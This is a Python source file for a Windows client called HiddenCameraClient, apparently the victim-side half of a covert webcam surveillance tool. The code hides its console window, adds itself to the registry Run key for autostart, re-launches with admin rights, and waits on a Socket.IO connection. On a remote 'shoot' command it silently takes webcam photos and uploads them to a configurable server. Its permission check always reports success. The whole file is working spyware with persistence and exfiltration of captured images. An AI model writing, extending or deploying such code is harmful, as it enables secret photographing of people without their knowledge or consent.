import os
import sys
import time
import threading
import requests
import cv2
import socketio
import winreg
import win32gui
import win32con
from PIL import Image
from io import BytesIO
import base64
import logging
import subprocess
import ctypes
from pathlib import Path

# 配置日志
logging.basicConfig(
    filename='client.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# 服务器配置
SERVER_URL = 'http://127.0.0.1:5000'  # 替换为你的服务器IP
SOCKET_URL = 'ws://127.0.0.1:5000'   # 替换为你的服务器IP

# 程序信息
APP_NAME = 'RemoteCameraClient'
APP_PATH = os.path.abspath(sys.argv[0])

class HiddenCameraClient:
    def __init__(self):
        self.sio = socketio.Client()
        self.running = False
        self.camera = None
        self.is_connected = False
        
        # 注册SocketIO事件
        self.register_socket_events()
    
    def register_socket_events(self):
        @self.sio.event
        def connect():
            logging.info('Connected to server')
            self.is_connected = True
        
        @self.sio.event
        def disconnect():
            logging.info('Disconnected from server')
            self.is_connected = False
        
        @self.sio.event
        def shoot():
            logging.info('=== Shoot Command Received ===')
            self.take_photo()
    
    def hide_console(self):
        """隐藏控制台窗口"""
        try:
            hwnd = win32gui.GetForegroundWindow()
            win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
        except Exception as e:
            logging.error(f'Error hiding console: {e}')
    
    def set_autostart(self, enable=True):
        """设置开机自启"""
        try:
            key_path = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
                if enable:
                    winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, APP_PATH)
                    logging.info('Autostart enabled')
                else:
                    try:
                        winreg.DeleteValue(key, APP_NAME)
                        logging.info('Autostart disabled')
                    except FileNotFoundError:
                        logging.info('Autostart was not enabled')
        except Exception as e:
            logging.error(f'Error setting autostart: {e}')
    
    def check_camera_permission(self):
        """检查摄像头权限，修改为更灵活的检测方式"""
        logging.info('Checking camera permission...')
        
        # 尝试多种后端，不严格依赖权限检查结果
        backends = [
            (cv2.CAP_DSHOW, "DirectShow"),
            (cv2.CAP_MSMF, "Media Foundation"),
            (cv2.CAP_ANY, "Any Backend")
        ]
        
        for backend, name in backends:
            try:
                logging.info(f'Trying permission check with {name} backend...')
                test_camera = cv2.VideoCapture(0, backend)
                if test_camera.isOpened():
                    test_camera.release()
                    logging.info(f'Permission granted with {name} backend')
                    return True
                test_camera.release()
            except Exception as e:
                logging.debug(f'Permission check failed with {name} backend: {e}')
        
        logging.warning('Permission check failed with all backends, will try to initialize anyway')
        # 即使权限检查失败，也返回True，让后续初始化尝试继续
        return True
    
    def find_available_cameras(self):
        """查找可用的摄像头设备，尝试多种后端"""
        available_cameras = []
        backends = [
            (cv2.CAP_DSHOW, "DirectShow"),
            (cv2.CAP_MSMF, "Media Foundation"),
            (cv2.CAP_ANY, "Any Backend")
        ]
        
        # 尝试检查前5个摄像头设备
        for i in range(5):
            for backend, name in backends:
                try:
                    logging.debug(f'Checking camera {i} with {name} backend...')
                    cap = cv2.VideoCapture(i, backend)
                    if cap.isOpened():
                        available_cameras.append((i, backend, name))
                        cap.release()
                        logging.info(f'Found camera {i} with {name} backend')
                        # 每个摄像头只添加一次
                        break
                    cap.release()
                except Exception as e:
                    logging.debug(f'Check failed for camera {i} with {name} backend: {e}')
        
        return available_cameras
    
    def initialize_camera(self):
        """初始化摄像头，支持多设备多后端检测和重试"""
        try:
            logging.info('=== Initializing Camera ===')
            
            # 不再严格依赖权限检查结果，直接尝试初始化
            
            # 查找可用摄像头
            available_cameras = self.find_available_cameras()
            if not available_cameras:
                logging.warning('No available cameras found, will try default camera 0')
                # 如果没有找到可用摄像头，尝试默认摄像头
                available_cameras = [(0, cv2.CAP_DSHOW, "DirectShow"),
                                     (0, cv2.CAP_MSMF, "Media Foundation"),
                                     (0, cv2.CAP_ANY, "Any Backend")]
            
            # 尝试初始化可用摄像头
            for camera_info in available_cameras:
                camera_index, backend, backend_name = camera_info
                
                try:
                    logging.info(f'Trying to initialize camera {camera_index} with {backend_name} backend...')
                    
                    # 创建摄像头对象，使用指定的后端
                    self.camera = cv2.VideoCapture(camera_index, backend)
                    
                    # 设置摄像头属性
                    self.camera.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
                    self.camera.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
                    self.camera.set(cv2.CAP_PROP_FPS, 30)
                    self.camera.set(cv2.CAP_PROP_AUTOFOCUS, 1)  # 自动对焦
                    
                    # 检查摄像头是否成功打开
                    if self.camera.isOpened():
                        # 测试是否能获取一帧图像
                        ret, _ = self.camera.read()
                        if ret:
                            logging.info(f'Successfully initialized camera {camera_index} with {backend_name} backend')
                            return True
                        else:
                            logging.warning(f'Camera {camera_index} opened but failed to capture frame, trying next...')
                            self.camera.release()
                    else:
                        logging.warning(f'Failed to open camera {camera_index} with {backend_name} backend, trying next...')
                        self.camera.release()
                        
                except Exception as e:
                    logging.error(f'Error initializing camera {camera_index} with {backend_name} backend: {e}')
                    if self.camera:
                        self.camera.release()
                        self.camera = None
                    continue
            
            # 尝试使用更低级的方式初始化
            logging.info('Trying low-level camera initialization...')
            try:
                # 使用cv2.CAP_ANY，让系统自动选择最佳后端
                self.camera = cv2.VideoCapture(0, cv2.CAP_ANY)
                if self.camera.isOpened():
                    ret, _ = self.camera.read()
                    if ret:
                        logging.info('Successfully initialized camera with low-level approach')
                        return True
                    self.camera.release()
            except Exception as e:
                logging.error(f'Low-level initialization failed: {e}')
            
            logging.error('Failed to initialize camera after all attempts')
            self.camera = None
            return False
            
        except Exception as e:
            logging.error(f'Unexpected error during camera initialization: {e}')
            import traceback
            logging.error(f'Traceback: {traceback.format_exc()}')
            if self.camera:
                self.camera.release()
                self.camera = None
            return False
    
    def take_photo(self):
        """拍摄照片，增强错误处理和重试机制"""
        try:
            # 确保摄像头已初始化
            if not self.camera or not self.camera.isOpened():
                logging.info('Camera not initialized, trying to initialize...')
                # 最多重试3次
                for attempt in range(3):
                    if self.initialize_camera():
                        break
                    logging.warning(f'Camera initialization attempt {attempt+1}/3 failed, retrying...')
                    time.sleep(1)
                
                if not self.camera or not self.camera.isOpened():
                    logging.error('Failed to initialize camera after multiple attempts')
                    return
            
            # 拍摄前短暂等待，确保摄像头准备就绪
            time.sleep(0.5)
            
            # 拍摄照片（连续读取3次，取最后一次结果以确保画面清晰）
            for i in range(3):
                ret, frame = self.camera.read()
                if ret:
                    break
                time.sleep(0.1)
            
            if not ret:
                logging.error('Failed to capture photo after multiple attempts')
                # 尝试重新初始化摄像头
                self.initialize_camera()
                return
            
            # 转换为PIL Image并压缩
            image = Image.fromarray(cv2.cvtColor(frame, cv2.COLOR_BGR2RGB))
            buffer = BytesIO()
            image.save(buffer, format='JPEG', quality=85)
            buffer.seek(0)
            
            # 上传照片
            self.upload_photo(buffer)
            logging.info('Photo taken and uploaded successfully')
            
        except Exception as e:
            logging.error(f'Error taking photo: {e}')
            # 异常发生后重新初始化摄像头
            self.camera = None
            self.initialize_camera()
    
    def upload_photo(self, photo_buffer):
        """上传照片到服务器"""
        logging.info('=== Uploading photo to server ===')
        try:
            # 记录服务器URL
            logging.info(f'Upload URL: {SERVER_URL}/upload')
            
            files = {'photo': ('photo.jpg', photo_buffer, 'image/jpeg')}
            # 上传照片时也发送自定义User-Agent
            headers = {'User-Agent': 'CameraClient'}
            
            logging.info('Sending POST request to server...')
            response = requests.post(f'{SERVER_URL}/upload', files=files, headers=headers, timeout=30)
            
            # 记录响应状态码
            logging.info(f'Server response status: {response.status_code}')
            
            response.raise_for_status()
            
            # 记录响应内容
            response_text = response.text
            logging.info(f'Server response: {response_text}')
            
            # 解析JSON响应
            result = response.json()
            logging.info(f'Photo uploaded successfully: {result}')
            
            if result.get('success'):
                logging.info(f'Photo saved as: {result.get("filename")}')
            
        except requests.ConnectionError as e:
            logging.error(f'Connection error when uploading photo: {e}')
            logging.error(f'Server URL: {SERVER_URL}/upload')
        except requests.Timeout as e:
            logging.error(f'Upload timeout error: {e}')
        except requests.HTTPError as e:
            logging.error(f'HTTP error when uploading photo: {e}')
            try:
                logging.error(f'Server error response: {e.response.text}')
            except:
                pass
        except Exception as e:
            logging.error(f'Unexpected error when uploading photo: {e}')
            import traceback
            logging.error(f'Traceback: {traceback.format_exc()}')
    
    def connect_to_server(self):
        """连接到服务器"""
        while self.running:
            try:
                if not self.is_connected:
                    # 设置自定义User-Agent，包含CameraClient标识
                    self.sio.connect(SOCKET_URL, headers={'User-Agent': 'CameraClient'})
                    logging.info('Connected to server')
                time.sleep(5)
            except Exception as e:
                logging.error(f'Error connecting to server: {e}')
                self.is_connected = False
                time.sleep(10)  # 连接失败后重试间隔
    
    def keep_alive(self):
        """保活机制，定期检查程序状态"""
        while self.running:
            try:
                # 检查摄像头状态
                if self.camera and not self.camera.isOpened():
                    logging.warning('Camera disconnected, reinitializing...')
                    self.initialize_camera()
                
                # 检查服务器连接 - connect_to_server方法本身会处理重连，不需要额外线程
                if not self.is_connected:
                    logging.warning('Server disconnected, connect_to_server will handle reconnection...')
                
                time.sleep(30)  # 每30秒检查一次
            except Exception as e:
                logging.error(f'Error in keep_alive: {e}')
                time.sleep(30)
    
    def run(self):
        """主运行函数"""
        self.running = True
        
        logging.info('=== Remote Camera Client Started ===')
        
        # 隐藏控制台窗口
        self.hide_console()
        
        # 设置开机自启
        self.set_autostart(enable=True)
        
        # 检查并记录程序路径
        logging.info(f'Program path: {APP_PATH}')
        
        # 检查摄像头权限
        if self.check_camera_permission():
            logging.info('Camera permission granted')
        else:
            logging.warning('Camera permission not granted, please check Windows privacy settings')
        
        # 查找并记录可用摄像头
        available_cameras = self.find_available_cameras()
        logging.info(f'Available cameras: {available_cameras}')
        
        # 初始化摄像头
        if self.initialize_camera():
            logging.info('Camera initialized on startup')
        else:
            logging.warning('Failed to initialize camera on startup, will retry later')
        
        # 启动服务器连接线程
        server_thread = threading.Thread(target=self.connect_to_server, daemon=True, name='ServerConnection')
        server_thread.start()
        logging.info('Server connection thread started')
        
        # 启动保活线程
        keep_alive_thread = threading.Thread(target=self.keep_alive, daemon=True, name='KeepAlive')
        keep_alive_thread.start()
        logging.info('Keep alive thread started')
        
        logging.info('Client started successfully in background')
        
        # 主循环
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            logging.info('Client stopped by keyboard interrupt')
        except Exception as e:
            logging.error(f'Unexpected error in main loop: {e}')
        finally:
            logging.info('Client shutting down, cleaning up resources...')
            self.cleanup()
    
    def cleanup(self):
        """清理资源"""
        self.running = False
        
        # 关闭摄像头
        if self.camera:
            try:
                self.camera.release()
                logging.info('Camera released')
            except Exception as e:
                logging.error(f'Error releasing camera: {e}')
            finally:
                self.camera = None
        
        # 断开服务器连接
        try:
            if self.is_connected:
                self.sio.disconnect()
                logging.info('Disconnected from server')
                self.is_connected = False
        except Exception as e:
            logging.error(f'Error disconnecting from server: {e}')
            self.is_connected = False
        
        logging.info('Client stopped successfully')

def is_admin():
    """检查是否以管理员身份运行"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    """以管理员身份重新运行程序"""
    try:
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, " ".join(sys.argv), None, 1
        )
    except Exception as e:
        logging.error(f'Error running as admin: {e}')
    sys.exit()

def hide_window():
    """隐藏窗口"""
    window = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(window, win32con.SW_HIDE)

if __name__ == '__main__':
    # 隐藏控制台窗口
    hide_window()
    
    # 检查是否以管理员身份运行（对于开机自启需要管理员权限）
    if not is_admin():
        run_as_admin()
    
    # 创建并运行客户端
    client = HiddenCameraClient()
    client.run()